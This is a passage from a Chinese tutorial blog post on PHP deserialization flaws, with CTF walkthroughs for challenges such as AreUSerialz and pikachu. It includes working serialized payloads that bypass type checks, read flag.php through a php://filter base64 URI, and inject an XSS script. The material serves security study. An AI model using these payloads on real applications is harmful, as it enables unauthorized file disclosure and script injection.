<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;FileHandlerop&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;FileHandlerfilename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;FileHandlercontent&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;%00FileHandler%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;%00FileHandler%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;%00FileHandler%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试三：protected</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;*op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;*filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;*content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>实际上是输出导致了不可见字符 <code>\x00</code> 的丢失</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;%00*%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;%00*%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;%00*%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="1-3-php-反序列化的触发"><a href="#1-3-php-反序列化的触发" class="headerlink" title="1.3 php 反序列化的触发"></a>1.3 php 反序列化的触发</h2><p><strong>触发条件：</strong></p>
<p>unserialize() 函数 的变量可控，文件当中存在可利用的类，类中存在魔术方法</p>
<p><strong>常见魔术方法：魔术方法就是 php 在进行有关类中变量序列化以及反序列化相关操作是会自动被调用的一些方法（函数）</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() 	<span class="comment">//使用serialize时触发 </span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把 一个对象 当作 字符串 使用时触发 </span></span><br><span class="line">    		<span class="comment">//例如：echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">其它魔术方法</a></p>
<p>理解魔术方法的调用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> test();  <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;echoP();   <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;    <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"><span class="variable">$s</span> =serialize(<span class="variable">$obj</span>);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$s</span>);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/g1OCJhFiYa7s8yk.png" alt="image-20210910213239299"></p>
<h2 id="1-4-无类简单题目"><a href="#1-4-无类简单题目" class="headerlink" title="1.4 无类简单题目"></a>1.4 无类简单题目</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;Love&quot;</span>;</span><br><span class="line">    <span class="variable">$str1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(unserialize(<span class="variable">$str1</span>) === <span class="variable">$str</span>)&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//WP:?str1=s:4:&quot;Love&quot;;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(unserialize(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">KEY</span>=&#x27;<span class="title">ISecer</span>:<span class="title">www</span>.<span class="title">isecer</span>.<span class="title">com</span>&#x27;;</span></span><br><span class="line"><span class="class">?&gt; </span></span><br><span class="line"><span class="class">//<span class="title">WP</span>:<span class="title">cookie</span>:<span class="title">ISecer</span>=<span class="title">s</span>:0:&quot;&quot;;</span></span><br><span class="line"><span class="class">    //顺序问题</span></span><br></pre></td></tr></table></figure>

<h2 id="1-5-有类简单题目"><a href="#1-5-有类简单题目" class="headerlink" title="1.5 有类简单题目"></a>1.5 有类简单题目</h2><p>触发魔术方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct <span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct <span class="comment">//对象被销毁时 触发 使用unserialize时触发</span></span><br><span class="line">__toString <span class="comment">//echo 或者 拼接字符串或者其它隐式调用该方法的操作都会被触发</span></span><br><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() 	<span class="comment">//使用serialize时触发 </span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>

<p>魔术方法参考：<a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p>
<h2 id="1-5-CTF-题目"><a href="#1-5-CTF-题目" class="headerlink" title="1.5 CTF 题目"></a>1.5 CTF 题目</h2><h3 id="1-5-1-CTFHUB-AreUSerialz"><a href="#1-5-1-CTFHUB-AreUSerialz" class="headerlink" title="1.5.1 CTFHUB AreUSerialz"></a>1.5.1 CTFHUB AreUSerialz</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">解释：</span><br><span class="line">1.?str传参，绕过is_valid() 之后，进行反序列化unserialize(<span class="variable">$str</span>)，</span><br><span class="line">  传入类对象的序列化值，将会触发 __construct() ，最后销毁对象时，会触发 __destruct()</span><br><span class="line">2. __construct() 对变量初始化操作</span><br><span class="line">3. __destruct() op值对比：2的话强制转换成1；</span><br><span class="line">4.调用process()函数</span><br><span class="line">5.op == <span class="string">&quot;1&quot;</span>为写内容；op == <span class="string">&quot;2&quot;</span>为读取内容</span><br><span class="line">6.我们需要读取到 flag.php文件当中的内容，应该越过 3. 中对op的检测</span><br><span class="line">  可以使用 弱类型绕过 op=空格2 或者是 op=数字2 来越过===</span><br><span class="line">7.这样即使使用的不是字符串2，也可以满足==的条件，从而读取到内容</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>; <span class="comment">//空格 2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:2:&quot; 2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<p>​        <em><em>protected权限的变量在序列化的时会有%00</em>%00字符</em>*，%00字符的ASCII码为0，就无法通过上面的 is_valid函数校验。</p>
<p><strong>解决办法1：</strong> <strong>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    public <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    public <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = new FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>解决办法2：</strong> <strong>%00更改为 \00，s 更改为 S</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//将所得到的内容中 %00更改为 \00，s 更改为 S</span></span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3BS%3A2%3A%22+2%22%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>

<p><strong>pikachu</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = unserialize(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$unser</span> = <span class="keyword">new</span> S();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$unser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-5-2-“百度杯”CTF比赛-十月场"><a href="#1-5-2-“百度杯”CTF比赛-十月场" class="headerlink" title="1.5.2 “百度杯”CTF比赛 十月场"></a>1.5.2 “百度杯”CTF比赛 十月场</h3><p><a href="https://www.ichunqiu.com/battalion?t=1&r=54967">题目链接</a></p>
<p>index.php?key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb</p>
<p>查看源代码</p>
<p><img src="https://i.loli.net/2021/09/10/XohASq2FvtG3Q4C.png" alt="image-20210910214204513"></p>
